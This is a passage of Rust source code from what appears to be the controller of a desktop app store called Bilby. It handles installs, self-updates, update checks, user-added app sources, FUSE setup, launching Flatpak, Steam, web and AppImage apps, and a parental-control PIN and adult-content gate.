                                    "{} FUSE, which it needs, has been added to this system and starts working after a restart.",
                                    outcome.message
                                )
                            }
                            false => unpack = true,
                        }
                    }
                }
                if unpack {
                    if let Some(file) = outcome.file.clone() {
                        match install::unpack_appimage(&file) {
                            Ok(program) => {
                                outcome.file = Some(program);
                                outcome.message = format!("{} Unpacked, so it runs here without FUSE.", outcome.message);
                            }
                            // Left as the file it is; opening it will say what is wrong.
                            Err(e) => outcome.message = format!("{} {e}", outcome.message),
                        }
                    }
                }
                Ok(outcome)
            },
            move |app, ui, result| {
                if app.fuse_just_staged.swap(false, Ordering::SeqCst) {
                    app.ask_restart(ui);
                }
                let store = ui.global::<Store>();
                // Started from the Library page rather than an app page?
                let updating_in_place = !store.get_updating_id().is_empty();
                store.set_updating_id(SharedString::new());
                match result {
                    Ok(outcome) => {
                        store.set_install_state(2);
                        store.set_install_message(outcome.message.as_str().into());
                        // A command to run, or another store taking over: nothing was
                        // installed by this store, so nothing goes in its library.
                        if matches!(option.plan.action, Action::ShowCommand | Action::OpenStore | Action::RunInTerminal)
                        {
                            return;
                        }
                        // The system's package manager installed it and keeps track of
                        // it; the page says so, and the store's own library stays as it is.
                        if option.plan.action == Action::RunCommand {
                            store.set_installed_version(if version.is_empty() {
                                "installed".into()
                            } else {
                                version.as_str().into()
                            });
                            app.toast(ui, &format!("{} is installed", store.get_app().name), false);
                            return;
                        }
                        let name = store.get_app().name.to_string();
                        let mut entry = InstalledApp::new(
                            &details.summary,
                            &version,
                            &option.label(),
                            &option.asset.name,
                            now_unix(),
                        );
                        entry.name = name.clone();
                        entry.path = outcome.file.as_ref().map(|p| p.display().to_string());
                        entry.store_managed = outcome.store_managed;
                        let id = entry.id.clone();
                        let is_self = app.store_app.as_ref().is_some_and(|own| own.to_string().eq_ignore_ascii_case(&id));
                        if let (true, true, Some(file)) = (is_self, outcome.store_managed, outcome.file.as_ref()) {
                            // A newer copy of the store itself. Its own menu entry is pointed
                            // at the new file, so the next start is the new version, and it
                            // offers to restart into it now. No second entry is made.
                            let _ = install::register_self(&app.dirs, file, ICON_PNG);
                            *app.self_new.lock().unwrap() = Some(file.clone());
                            store.set_install_message(
                                format!("Bilby {version} is on this device. Press Open to restart into it; it also starts next time you open Bilby from your app menu.").into(),
                            );
                            let previous =
                                app.state().installed(&id).filter(|a| a.store_managed).and_then(|a| a.path.clone());
                            if let Some(previous) = previous.map(PathBuf::from) {
                                if previous != *file {
                                    install::remove_placed(&app.dirs, &previous);
                                }
                            }
                        } else if let (true, Some(file)) = (outcome.store_managed, outcome.file.as_ref()) {
                            // Start it from the app menu like anything else that is installed.
                            if install::add_menu_entry(&app.dirs, &id, &name, file).is_ok() {
                                store
                                    .set_install_message(format!("{} It is in your app menu.", outcome.message).into());
                            }
                            // The version this replaces was a different file: do not leave it behind.
                            let previous =
                                app.state().installed(&id).filter(|a| a.store_managed).and_then(|a| a.path.clone());
                            if let Some(previous) = previous.map(PathBuf::from) {
                                if previous != *file {
                                    install::remove_placed(&app.dirs, &previous);
                                }
                            }
                        }
                        app.update_state(ui, |state| state.record_install(entry));
                        // Installing an older version on purpose leaves an update pending.
                        let newest = details.versions.first().map(|r| r.version.clone()).unwrap_or_default();
                        let status = if bilby_core::version::is_newer(&newest, &version) {
                            let label = details.versions[0].options.first().map(|o| o.label()).unwrap_or_default();
                            UpdateStatus::Available { version: newest, label }
                        } else {
                            UpdateStatus::UpToDate
                        };
                        app.updates.lock().unwrap().insert(id, status);
                        store.set_installed_version(version.into());
                        app.refresh(ui);
                        if updating_in_place {
                            store.set_install_state(0);
                            app.toast(ui, &format!("{name} updated to {}", store.get_installed_version()), false);
                        } else {
                            app.toast(ui, &format!("{name} is in your library"), false);
                        }
                    }
                    Err(Error::Cancelled) => {
                        store.set_install_state(0);
                        // Cancelling one stops the rest of an "Update all" too.
                        app.update_queue.lock().unwrap().clear();
                        app.toast(ui, "Download cancelled", false);
                    }
                    Err(e) => {
                        if updating_in_place {
                            // There is no app page open to show the message on.
                            store.set_install_state(0);
                            app.toast(ui, &format!("Update failed: {e}"), true);
                        } else {
                            store.set_install_state(3);
                            store.set_install_message(e.to_string().into());
                        }
                    }
                }
                if updating_in_place {
                    app.update_next(ui);
                }
            },
        );
    }

    // ---- library ----

    pub fn check_updates(self: &Arc<Self>, ui: &AppWindow, announce: bool) {
        let store = ui.global::<Store>();
        let apps: Vec<(AppId, String)> =
            self.state().library.iter().filter_map(|a| Some((AppId::parse(&a.id)?, a.version.clone()))).collect();
        if apps.is_empty() || store.get_checking_updates() {
            return;
        }
        store.set_checking_updates(true);
        let work_apps = apps.clone();
        self.job(
            move |app| app.catalog().check_updates(&work_apps),
            move |app, ui, statuses| {
                let available = statuses.iter().filter(|s| matches!(s, UpdateStatus::Available { .. })).count();
                let failed = statuses.iter().filter(|s| matches!(s, UpdateStatus::Unknown(_))).count();
                {
                    let mut updates = app.updates.lock().unwrap();
                    let state = app.state();
                    for ((id, _), status) in apps.iter().zip(statuses) {
                        let id = id.to_string();
                        // A version the user chose to skip is not announced again.
                        let skipped = state.installed(&id).map(|a| a.skipped_version.clone()).unwrap_or_default();
                        let status = match status {
                            UpdateStatus::Available { version, .. } if version == skipped => UpdateStatus::UpToDate,
                            other => other,
                        };
                        updates.insert(id, status);
                    }
                }
                app.last_checked.store(now_unix(), Ordering::SeqCst);
                ui.global::<Store>().set_checking_updates(false);
                app.refresh(ui);
                if announce {
                    let message = match (available, failed) {
                        (0, 0) => "Everything is up to date".to_string(),
                        (0, f) => format!("Couldn't check {}", plural(f, "app")),
                        (n, _) => format!("{} available", plural(n, "update")),
                    };
                    app.toast(ui, &message, available == 0 && failed > 0);
                }
            },
        );
    }

    /// Is there a newer release of the store itself with a file for this device? One
    /// request, and quiet: the answer appears in Settings.
    pub fn check_store_update(self: &Arc<Self>, ui: &AppWindow) {
        let _ = ui;
        let Some(id) = self.store_app.clone() else { return };
        self.job(
            move |app| app.catalog().check_update(&id, env!("CARGO_PKG_VERSION")),
            |_app, ui, status| {
                let version = match status {
                    UpdateStatus::Available { version, .. } => version,
                    // Up to date, nothing for this device, or could not be checked: say nothing.
                    _ => String::new(),
                };
                ui.global::<Store>().set_store_update(version.into());
            },
        );
    }

    /// Where downloads go: the folder the person chose in Settings, else the usual one.
    fn downloads_folder(&self) -> PathBuf {
        let chosen = self.state.lock().unwrap().settings.downloads_dir.trim().to_string();
        if chosen.is_empty() {
            self.dirs.downloads.clone()
        } else {
            PathBuf::from(chosen)
        }
    }

    /// The folders for the download about to start: as usual, but saving where the
    /// person just said to, if they were asked.
    fn dirs_for_download(&self) -> Dirs {
        let mut dirs = self.dirs.clone();
        dirs.downloads = self.asked_folder.lock().unwrap().take().unwrap_or_else(|| self.downloads_folder());
        dirs
    }

    /// With "ask where to save each download" on: ask now. False when the person
    /// backed out, which stops the download; true otherwise (also where this system
    /// has no dialog to ask with, so that the setting cannot block every install).
    fn ask_where_to_save(&self, action: &Action) -> bool {
        if !self.state.lock().unwrap().settings.ask_where || !install::saves_a_file(action) {
            return true;
        }
        match (self.picker)(&self.downloads_folder()) {
            Picked::Folder(folder) => {
                *self.asked_folder.lock().unwrap() = Some(folder);
                true
            }
            Picked::Cancelled => false,
            Picked::NoDialog => true,
        }
    }

    /// Add a list of apps on the person's own server or storage, by its address. It
    /// is fetched first: something that is not such a list is refused with the reason.
    pub fn add_own_source(self: &Arc<Self>, ui: &AppWindow, url: &str) {
        let url = url.trim().to_string();
        if url.is_empty() {
            return;
        }
        if self.state().settings.own_sources.iter().any(|own| own.url == url) {
            self.toast(ui, "That source is already among yours.", true);
            return;
        }
        self.toast(ui, "Looking at that address…", false);
        let address = url.clone();
        self.job(
            move |app| bilby_core::source::own::look(app.catalog().http().as_ref(), &address),
            move |app, ui, found| match found {
                Ok((name, apps)) => {
                    // Two sources may not go by the same short name: their apps' ids would clash.
                    let taken = |candidate: &str| {
                        let slug = bilby_core::source::own::slug(candidate);
                        app.state()
                            .settings
                            .own_sources
                            .iter()
                            .any(|own| bilby_core::source::own::slug(&own.name) == slug)
                    };
                    let mut called = name.clone();
                    let mut n = 2;
                    while taken(&called) {
                        called = format!("{name} {n}");
                        n += 1;
                    }
                    let own = bilby_core::state::OwnSource { name: called.clone(), url: url.clone() };
                    app.update_state(ui, |state| state.settings.own_sources.push(own));
                    app.rebuild_catalog();
                    app.collections.lock().unwrap().clear();
                    app.load_collections(ui);
                    app.refresh_settings(ui);
                    app.refresh(ui);
                    let apps = if apps == 1 { "1 app".to_string() } else { format!("{apps} apps") };
                    app.toast(ui, &format!("Added “{called}”: {apps}"), false);
                }
                Err(e) => app.toast(ui, &format!("Not added. {e}"), true),
            },
        );
    }

    /// Take one of the person's own sources away. What was installed from it stays.
    pub fn remove_own_source(self: &Arc<Self>, ui: &AppWindow, url: &str) {
        let url = url.to_string();
        self.update_state(ui, |state| state.settings.own_sources.retain(|own| own.url != url));
        self.rebuild_catalog();
        self.collections.lock().unwrap().clear();
        self.load_collections(ui);
        self.refresh_settings(ui);
        self.refresh(ui);
        self.toast(ui, "Source removed", false);
    }

    /// Choose the folder downloads go to, with the system's own dialog.
    pub fn choose_downloads(&self, ui: &AppWindow) {
        match (self.picker)(&self.downloads_folder()) {
            Picked::Folder(folder) => self.set_downloads(ui, &folder.display().to_string()),
            Picked::Cancelled => {}
            Picked::NoDialog => self.toast(
                ui,
                "This system has no folder chooser Bilby can call. Type the folder's path instead.",
                true,
            ),
        }
    }

    /// Set the folder downloads go to. Empty goes back to the usual one. A folder
    /// that cannot be made or written to is refused, with the reason.
    pub fn set_downloads(&self, ui: &AppWindow, path: &str) {
        let path = path.trim();
        if !path.is_empty() {
            let folder = PathBuf::from(path);
            let usable = folder.is_absolute()
                && std::fs::create_dir_all(&folder).is_ok()
                && std::fs::write(folder.join(".bilby-write-test"), b"").is_ok();
            let _ = std::fs::remove_file(folder.join(".bilby-write-test"));
            if !usable {
                self.toast(
                    ui,
                    "That folder cannot be used: it must be a full path that this account can write to.",
                    true,
                );
                return;
            }
        }
        let path = path.to_string();
        self.update_state(ui, |state| state.settings.downloads_dir = path);
        self.refresh_settings(ui);
        self.toast(ui, &format!("Downloads now go to {}", self.downloads_folder().display()), false);
    }

    /// Install a package an app needs before it will run, from the system's own
    /// repository, the way any package is installed (the system asks for the password).
    fn install_requirement(&self, package: &AppId) -> bilby_core::Result<()> {
        let details = self.catalog().details(package)?;
        let option = details.release.as_ref().and_then(|release| release.options.first()).ok_or_else(|| {
            Error::Unsupported(format!("{} could not be installed: nothing to install was found.", package.key))
        })?;
        let http = self.catalog().http();
        install::execute(&option.plan, &option.asset, http.as_ref(), &self.dirs, self.opener.as_ref(), &mut |_, _| {
            true
        })
        .map_err(|e| {
            Error::Unsupported(format!("What this app needs ({}) could not be installed: {e}", package.key))
        })?;
        // Look again at what the system has, so the notice goes once it is there.
        let now = match self.fuse_given {
            true => bilby_core::needs::Fuse { library: true, mounter: true },
            false => bilby_core::needs::fuse_here(),
        };
        *self.fuse.write().unwrap() = now;
        Ok(())
    }

    /// Make one of the quiet sounds of moving about, unless they are switched off.
    pub fn play(&self, sound: sound::Sound) {
        if self.state.lock().unwrap().settings.mute_sounds {
            return;
        }
        if let Some(heard) = &self.heard {
            heard(sound);
            return;
        }
        #[cfg(not(target_os = "android"))]
        if !self.silent {
            self.player.get_or_init(sound::Player::start).play(sound);
        }
    }

    /// On a Linux TV a website opens in Longboard; anywhere else in the usual browser.
    fn opens_sites_in_longboard(&self) -> bool {
        let platform = self.platform.read().unwrap();
        platform.os == Os::Linux && platform.form_factor == FormFactor::Tv
    }

    /// What stands between the person and something for adults, right now.
    fn gate_for_adult(&self) -> bilby_core::parental::Gate {
        let settings = self.state().settings;
        // Asked to show adult things as they are: that was the question, answered.
        if settings.adult_uncovered && !settings.family_mode {
            return bilby_core::parental::Gate::Open;
        }
        let policy =
            bilby_core::parental::Policy { family_mode: settings.family_mode, adult_on_home: settings.adult_on_home };
        bilby_core::parental::to_open_adult(
            policy,
            !settings.pin_hash.is_empty(),
            settings.adult_confirmed,
            self.adult_unlocked.load(Ordering::SeqCst),
        )
    }

    /// Installing and removing ask for the PIN where the person chose that. Entering
    /// it clears exactly one action.
    fn needs_pin_to_install(&self) -> bool {
        let settings = self.state().settings;
        settings.pin_for_installs
            && !settings.pin_hash.is_empty()
            && !self.install_cleared.swap(false, Ordering::SeqCst)
    }

    /// Put the question on screen: 1 "are you an adult?", 2 the PIN, 3 a new PIN,
    /// 4 the new PIN again. What was being done waits for the answer.
    fn ask(&self, ui: &AppWindow, kind: i32, title: &str, text: &str, waiting: Guarded) {
        *self.pending.lock().unwrap() = Some(waiting);
        let store = ui.global::<Store>();
        store.set_gate_title(title.into());
        store.set_gate_text(text.into());
        store.set_gate_error(SharedString::new());
        store.set_gate_no("No".into());
        store.set_gate_yes("Yes, I am 18 or over".into());
        store.set_gate(kind);
    }

    /// Add FUSE on top of a read-only system's image, once. True when it is in place
    /// and waiting for a restart.
    fn stage_fuse(&self, tool: &std::path::Path) -> bool {
        if self.fuse_staged.load(Ordering::SeqCst) {
            return true;
        }
        let added = bilby_core::needs::layer_fuse(tool).is_ok();
        if added {
            self.fuse_staged.store(true, Ordering::SeqCst);
            self.fuse_just_staged.store(true, Ordering::SeqCst);
        }
        added
    }

    /// FUSE has been added and works from the next restart: now, or later?
    fn ask_restart(&self, ui: &AppWindow) {
        self.ask(
            ui,
            1,
            "Restart to finish",
            "Bilby has added FUSE to this system, which this app needs to run. It starts working after a restart.",
            Guarded::Restart,
        );
        let store = ui.global::<Store>();
        store.set_gate_no("Restart later".into());
        store.set_gate_yes("Restart now".into());
    }

    fn close_gate(&self, ui: &AppWindow) {
        let store = ui.global::<Store>();
        store.set_gate(0);
        store.set_gate_error(SharedString::new());
    }

    /// The person stepped back from the question: nothing happens.
    pub fn gate_cancel(&self, ui: &AppWindow) {
        *self.pending.lock().unwrap() = None;
        *self.new_pin.lock().unwrap() = None;
        self.close_gate(ui);
        self.refresh_settings(ui);
    }

    /// The answer to "are you 18 or over?". A yes is remembered; a no changes nothing.
    pub fn gate_answer(self: &Arc<Self>, ui: &AppWindow, yes: bool) {
        if matches!(*self.pending.lock().unwrap(), Some(Guarded::Restart)) {
            *self.pending.lock().unwrap() = None;
            self.close_gate(ui);
            match yes.then(|| (self.restart)()) {
                Some(Ok(())) => self.toast(ui, "Restarting…", false),
                Some(Err(e)) => {
                    self.toast(ui, &format!("Couldn't restart from here ({e}). Restart from your system's menu."), true)
                }
                None => self.toast(ui, "It will run after the next restart.", false),
            }
            return;
        }
        if ui.global::<Store>().get_gate() != 1 || !yes {
            self.gate_cancel(ui);
            return;
        }
        self.update_state(ui, |state| state.settings.adult_confirmed = true);
        self.close_gate(ui);
        self.carry_on(ui);
    }

    /// Four digits were entered at the gate.
    pub fn gate_pin(self: &Arc<Self>, ui: &AppWindow, entry: &str) {
        use bilby_core::parental;
        let store = ui.global::<Store>();
        match store.get_gate() {
            2 => {
                let settings = self.state().settings;
                if parental::valid_pin(entry) && parental::hash_pin(&settings.pin_salt, entry) == settings.pin_hash {
                    // Given to open adult content, it holds for the rest of this
                    // sitting; given for anything else, it covers that one thing.
                    if matches!(*self.pending.lock().unwrap(), Some(Guarded::OpenAdult(_))) {
                        self.adult_unlocked.store(true, Ordering::SeqCst);
                    }
                    self.close_gate(ui);
                    self.carry_on(ui);
                } else {
                    store.set_gate_error("That is not the PIN. Try again.".into());
                }
            }
            3 => {
                if parental::valid_pin(entry) {
                    *self.new_pin.lock().unwrap() = Some(entry.to_string());
                    store.set_gate_title("Enter the new PIN again".into());
                    store.set_gate_text("To be sure it is the one you meant.".into());
                    store.set_gate_error(SharedString::new());
                    store.set_gate(4);
                }
            }
            4 => {
                let first = self.new_pin.lock().unwrap().take();
                if first.as_deref() == Some(entry) && parental::valid_pin(entry) {
                    let salt = parental::new_salt();
                    let hash = parental::hash_pin(&salt, entry);
                    self.update_state(ui, |state| {
                        state.settings.pin_salt = salt;
                        state.settings.pin_hash = hash;
                    });
                    *self.pending.lock().unwrap() = None;
                    self.close_gate(ui);
                    self.refresh_settings(ui);
                    self.toast(ui, "The PIN is set. Remember it: it cannot be shown again.", false);
                } else {
                    store.set_gate_title("Choose a PIN".into());
                    store.set_gate_text("Those two were not the same. Choose four digits.".into());
                    store.set_gate(3);
                }
            }
            _ => {}
        }
    }

    /// Do what was waiting on the answer.
    fn carry_on(self: &Arc<Self>, ui: &AppWindow) {
        let Some(waiting) = self.pending.lock().unwrap().take() else { return };
        match waiting {
            Guarded::OpenAdult(id) => self.open(ui, &id),
            Guarded::Install(index) => {
                self.install_cleared.store(true, Ordering::SeqCst);
                self.install(ui, index);
            }
            Guarded::Remove(id) => {
                self.install_cleared.store(true, Ordering::SeqCst);
                self.remove_from_library(ui, &id);
            }
            Guarded::Setting(change) => self.apply_setting(ui, change),
            Guarded::Restart => {}
        }
    }

    /// Change a family or adult-content setting, asking first where that is called for.
    pub fn request_setting(self: &Arc<Self>, ui: &AppWindow, change: Change) {
        use bilby_core::parental::{to_change_settings, Gate};
        let settings = self.state().settings;
        let has_pin = !settings.pin_hash.is_empty();
        let stricter = matches!(
            change,
            Change::FamilyMode(true)
                | Change::AdultOnHome(false)
                | Change::AdultUncovered(false)
                | Change::PinForInstalls(true)
        );
        if to_change_settings(has_pin, stricter) == Gate::Pin {
            self.ask(ui, 2, "Enter the PIN", "The PIN guards these settings.", Guarded::Setting(change));
            return;
        }
        // Without a PIN, asking for adult things on the home page is itself the
        // question of being an adult.
        if change == Change::AdultUncovered(true) && !settings.adult_confirmed {
            let text = "This shows things meant for adults as they are, with nothing covered. Are you 18 or over?";
            self.ask(ui, 1, "Adult content", text, Guarded::Setting(change));
            return;
        }
        if change == Change::AdultOnHome(true) && !settings.adult_confirmed {
            let text = "This shows things meant for adults on the home page, covered until chosen. Are you 18 or over?";
            self.ask(ui, 1, "Adult content", text, Guarded::Setting(change));
            return;
        }
        self.apply_setting(ui, change);
    }

    fn apply_setting(self: &Arc<Self>, ui: &AppWindow, change: Change) {
        match change {
            Change::SetPin => {
                *self.pending.lock().unwrap() = None;
                let store = ui.global::<Store>();
                store.set_gate_title("Choose a PIN".into());
                store.set_gate_text(
                    "Four digits. It will be asked for to change these settings and to open adult content.".into(),
                );
                store.set_gate_error(SharedString::new());
                store.set_gate(3);
                return;
            }
            Change::RemovePin => {
                self.update_state(ui, |state| {
                    state.settings.pin_hash.clear();
                    state.settings.pin_salt.clear();
                    state.settings.pin_for_installs = false;
                });
                self.adult_unlocked.store(false, Ordering::SeqCst);
                self.toast(ui, "The PIN is removed", false);
            }
            Change::FamilyMode(on) => {
                self.update_state(ui, |state| state.settings.family_mode = on);
                let said = if on { "Family mode is on: nothing for adults is shown" } else { "Family mode is off" };
                self.toast(ui, said, false);
            }
            Change::AdultOnHome(on) => {
                self.update_state(ui, |state| {
                    state.settings.adult_on_home = on;
                    state.settings.adult_confirmed |= on;
                });
            }
            Change::AdultUncovered(on) => {
                self.update_state(ui, |state| {
                    state.settings.adult_uncovered = on;
                    state.settings.adult_confirmed |= on;
                });
            }
            Change::PinForInstalls(on) => {
                if on && self.state().settings.pin_hash.is_empty() {
                    self.toast(ui, "Set a PIN first", true);
                } else {
                    self.update_state(ui, |state| state.settings.pin_for_installs = on);
                }
            }
        }
        // What is listed depends on it: build the catalog again and redraw.
        self.rebuild_catalog();
        self.collections.lock().unwrap().clear();
        self.load_collections(ui);
        self.refresh_settings(ui);
        self.refresh(ui);
    }

    /// The store is an app like any other and is, plainly, installed: it is kept in
    /// the library at the version that is running, so that it is listed, marked
    /// installed wherever it is shown, and offered updates like the rest.
    fn note_self(&self, ui: &AppWindow) {
        let Some(id) = self.store_app.clone() else { return };
        let running = format!("v{}", env!("CARGO_PKG_VERSION"));
        let program = self.self_program.as_ref().map(|path| path.display().to_string());
        let unchanged = self.state.lock().unwrap().installed(&id.to_string()).is_some_and(|own| own.version == running);
        if unchanged {
            return;
        }
        self.update_state(ui, |state| {
            let text = id.to_string();
            match state.library.iter_mut().find(|app| app.id.eq_ignore_ascii_case(&text)) {
                // A newer copy is running than the one last noted.
                Some(own) => {
                    own.version = running.clone();
                    own.skipped_version.clear();
                }
                None => {
                    let mut summary = AppSummary::new(id.clone(), "Bilby");
                    summary.author = "This store".to_string();
                    summary.summary = "The app store you are using.".to_string();
                    let mut own = InstalledApp::new(&summary, &running, "", "", now_unix());
                    own.path = program.clone();
                    state.library.push(own);
                }
            }
        });
    }

    /// Look for a newer Bilby because the person asked, and say what was found.
    pub fn check_store_update_now(self: &Arc<Self>, ui: &AppWindow) {
        let Some(id) = self.store_app.clone() else { return };
        self.toast(ui, "Looking for a newer Bilby…", false);
        self.job(
            move |app| app.catalog().check_update(&id, env!("CARGO_PKG_VERSION")),
            |app, ui, status| {
                let have = env!("CARGO_PKG_VERSION");
                let (version, message, bad) = match status {
                    UpdateStatus::Available { version, .. } => {
                        let message = format!("Bilby {version} is available. You have {have}.");
                        (version, message, false)
                    }
                    UpdateStatus::Unknown(why) => {
                        (String::new(), format!("Could not look for a newer Bilby: {why}"), true)
                    }
                    _ => (String::new(), format!("Bilby {have} is the newest version."), false),
                };
                ui.global::<Store>().set_store_update(version.into());
                app.refresh(ui);
                app.toast(ui, &message, bad);
            },
        );
    }

    /// Find what is installed on the device that the store did not install: Flatpaks,
    /// Steam games and the system's packages. Read from disk, in the background.
    pub fn scan_installed(self: &Arc<Self>, ui: &AppWindow) {
        let _ = ui;
        self.job(
            |app| {
                let os = app.platform.read().unwrap().os;
                let mut apps: Vec<(String, String)> =
                    bilby_core::source::flathub::installed_apps(&app.dirs.flatpak_roots)
                        .into_iter()
                        .map(|(id, name)| (format!("flathub:{id}"), name))
                        .collect();
                let libraries =
                    app.steam_libraries.clone().unwrap_or_else(|| bilby_core::source::steam::default_libraries(os));
                apps.extend(
                    bilby_core::source::steam::installed_games(&libraries)
                        .into_iter()
                        .map(|(id, name)| (format!("steam:{id}"), name)),
                );
                let packages = app.catalog().installed_packages().iter().map(|name| plain(name)).collect();
                Elsewhere { apps, packages }
            },
            |app, ui, found| {
                *app.elsewhere.write().unwrap() = found;
                app.refresh(ui);
            },
        );
    }

    /// Is this app on the device although the store did not install it? Its own entry
    /// may be (a Flatpak, a Steam game), or the system's package of the same name: the
    /// VLC on Flathub's page is "installed" when the distribution's vlc is.
    fn installed_elsewhere(&self, id: &AppId, name: &str) -> bool {
        let known = self.elsewhere.read().unwrap();
        let text = id.to_string();
        if known.apps.iter().any(|(app, _)| app.eq_ignore_ascii_case(&text)) {
            return true;
        }
        // By name, only when the app's name and the last part of its id agree on it,
        // so that somebody's unrelated project called "notes" is not marked.
        let tail = plain(id.key.rsplit(['/', '.']).next().unwrap_or(&id.key));
        tail.chars().count() >= 3 && tail == plain(name) && known.packages.contains(&tail)
    }

    /// Stop offering the update that is waiting for this app; the one after it is
    /// announced as usual.
    pub fn skip_update(&self, ui: &AppWindow, id: &str) {
        let waiting = self.updates.lock().unwrap().get(id).cloned();
        let Some(UpdateStatus::Available { version, .. }) = waiting else { return };
        let mut name = String::new();
        self.update_state(ui, |state| {
            if state.skip_version(id, &version) {
                name = state.installed(id).map(|a| a.name.clone()).unwrap_or_default();
            }
        });
        if name.is_empty() {
            return;
        }
        self.updates.lock().unwrap().insert(id.to_string(), UpdateStatus::UpToDate);
        self.refresh(ui);
        self.toast(ui, &format!("Skipping {name} {version}. You'll hear about the next one."), false);
    }

    /// The file to run for an app the store placed itself, if it is still there.
    fn launchable(&self, id: &str) -> Option<PathBuf> {
        // The store itself is already open. Only a newer copy just placed can be
        // "opened": that restarts into it.
        if self.store_app.as_ref().is_some_and(|own| own.to_string().eq_ignore_ascii_case(id)) {
            return self.self_new.lock().unwrap().clone();
        }
        let state = self.state.lock().unwrap();
        // A web app is opened by starting Longboard on its address on a TV, and in
        // the person's own browser anywhere else.
        if id.starts_with("web:") {
            state.installed(id)?;
            if !self.opens_sites_in_longboard() {
                return Some(PathBuf::from("browser"));
            }
            return install::find_longboard(&self.dirs);
        }
        // A Flatpak is run by Flatpak, whoever installed it.
        if let Some(app_id) = id.strip_prefix("flathub:") {
            return bilby_core::source::flathub::is_installed(&self.dirs.flatpak_roots, app_id)
                .then(|| self.dirs.flatpak.clone());
        }
        // Something Steam has installed is started by asking Steam.
        if let Some(number) = id.strip_prefix("steam:") {
            use bilby_core::source::steam;
            let os = self.platform.read().unwrap().os;
            let libraries = self.steam_libraries.clone().unwrap_or_else(|| steam::default_libraries(os));
            return steam::is_installed(&libraries, number).then(|| steam::run_link(number)).flatten();
        }
        let app = state.installed(id).filter(|a| a.store_managed)?;
        let path = PathBuf::from(app.path.as_deref()?);
        (path.starts_with(&self.dirs.applications) && path.is_file()).then_some(path)
    }

    /// Start the open app, when the store installed it as a file it can run.
    pub fn launch(self: &Arc<Self>, ui: &AppWindow) {
        let store = ui.global::<Store>();
        let id = store.get_app().id.to_string();
        let Some(path) = self.launchable(&id) else { return };
        // The store's own newer copy: start it and leave, so the person is in the new
        // version at once.
        if self.store_app.as_ref().is_some_and(|own| own.to_string().eq_ignore_ascii_case(&id)) {
            match (self.launcher)(&path) {
                Ok(()) => {
                    self.toast(ui, "Restarting into the new Bilby…", false);
                    if !self.inline {
                        let _ = slint::quit_event_loop();
                    }
                }
                Err(e) => self.toast(ui, &format!("The new Bilby is installed but could not be started: {e}"), true),
            }
            return;
        }
        let started = if let Some(host) = id.strip_prefix("web:").filter(|_| !self.opens_sites_in_longboard()) {
            (self.browser)(&format!("https://{host}/"))
        } else if let Some(host) = id.strip_prefix("web:") {
            (self.runner)(&path, &[format!("--url=https://{host}/")])
        } else if let Some(app_id) = id.strip_prefix("flathub:") {
            (self.runner)(&path, &["run".to_string(), app_id.to_string()])
        } else if id.starts_with("steam:") {
            // A link, handed to the system, which passes it to Steam.
            (self.opener)(&path)
        } else {
            // A program is watched for a moment as it starts, away from the interface:
            // one that closes straight away says why.
            let requirement = self.needed.lock().unwrap().clone();
            let lacks_fuse = self.lacks_fuse.load(Ordering::SeqCst);
            let layering = if lacks_fuse { self.layering.clone() } else { None };
            // Already added and waiting on a restart: starting it now would only fail.
            if layering.is_some() && self.fuse_staged.load(Ordering::SeqCst) {
                self.ask_restart(ui);
                return;
            }
            let said = match (lacks_fuse, &requirement) {
                _ if layering.is_some() => format!("Adding what {} needs to this system…", store.get_app().name),
                (true, Some(_)) => format!("Installing what {} needs, then opening it…", store.get_app().name),
                (true, None) => {
                    format!("Getting {} ready to run on this system, then opening it…", store.get_app().name)
                }
                _ => format!("Opening {}…", store.get_app().name),
            };
            self.toast(ui, &said, false);
            let launcher = self.launcher.clone();
            let app_id = id.clone();
            let app_name = store.get_app().name.to_string();
            self.job(
                move |app| {
                    // As when installing: FUSE where it can be had, else unpack the app.
                    let mut program = path.clone();
                    let mut unpack = lacks_fuse && requirement.is_none();
                    if let Some(tool) = &layering {
                        // Added: it runs after a restart, which is asked about next.
                        if app.stage_fuse(tool) {
                            return Ok(None);
                        }
                        unpack = true;
                    } else if let (true, Some(package)) = (lacks_fuse, &requirement) {
                        unpack = app.install_requirement(package).is_err();
                    }
                    if unpack {
                        program = install::unpack_appimage(&path)?;
                    }
                    launcher(&program)?;
                    Ok((program != path).then_some(program))
                },
                move |app, ui, started: bilby_core::Result<Option<PathBuf>>| match started {
                    Ok(None) if app.fuse_just_staged.swap(false, Ordering::SeqCst) => {
                        app.show_app_sources(ui);
                        app.ask_restart(ui);
                    }
                    // It runs from its folder now: the library and the menu follow.
                    Ok(Some(program)) => {
                        let now = program.display().to_string();
                        app.update_state(ui, |state| {
                            if let Some(entry) = state.library.iter_mut().find(|a| a.id == app_id) {
                                entry.path = Some(now.clone());
                            }
                        });
                        let _ = install::add_menu_entry(&app.dirs, &app_id, &app_name, &program);
                        app.show_app_sources(ui);
                    }
                    Ok(None) => {}
                    Err(e) => app.toast(ui, &format!("Couldn't open it. {e}"), true),
                },
            );
            return;
        };
        match started {
            Ok(()) => self.toast(ui, &format!("Opening {}…", store.get_app().name), false),
            Err(e) => self.toast(ui, &format!("Couldn't open it: {e}"), true),
        }
    }

    /// Add the open app to the favourites, or take it out.
    pub fn toggle_favourite(&self, ui: &AppWindow) {
        let card = ui.global::<Store>().get_app();
        if AppId::parse(card.id.as_str()).is_none() {
            return;
        }
        let favourite = Favourite {
            id: card.id.to_string(),
            name: card.name.to_string(),
            author: card.author.to_string(),
            summary: card.summary.to_string(),
        };
        let mut added = false;
        self.update_state(ui, |state| added = state.toggle_favourite(favourite));
        self.refresh(ui);
        let message = if added { "Added to favourites. Find them in your library." } else { "Removed from favourites" };
        self.toast(ui, message, false);
    }

    pub fn remove_from_library(&self, ui: &AppWindow, id: &str) {
        if self.store_app.as_ref().is_some_and(|own| own.to_string().eq_ignore_ascii_case(id)) {
            self.toast(ui, "That is Bilby itself, which you are using. To remove it, delete its file.", true);
            return;
        }
        if self.needs_pin_to_install() {
            let why = "A PIN is needed to install or remove apps on this device.";
            self.ask(ui, 2, "Enter the PIN", why, Guarded::Remove(id.to_string()));
            return;
        }
        let mut removed = None;
        self.update_state(ui, |state| removed = state.remove(id));
        let Some(entry) = removed else { return };
        self.updates.lock().unwrap().remove(id);
        let mut message = format!("{} removed from your library", entry.name);
        // Only files the store itself placed, and only inside its own Applications folder.
        if let (true, Some(path)) = (entry.store_managed, entry.path.as_deref()) {
            let path = PathBuf::from(path);
            if install::remove_placed(&self.dirs, &path) {
                message = format!("{} uninstalled", entry.name);
            }
        }
        // Whatever the store put in the app menu for it goes too (an AppImage, a web app).
        install::remove_menu_entry(&self.dirs, id);
        if id.starts_with("web:") {
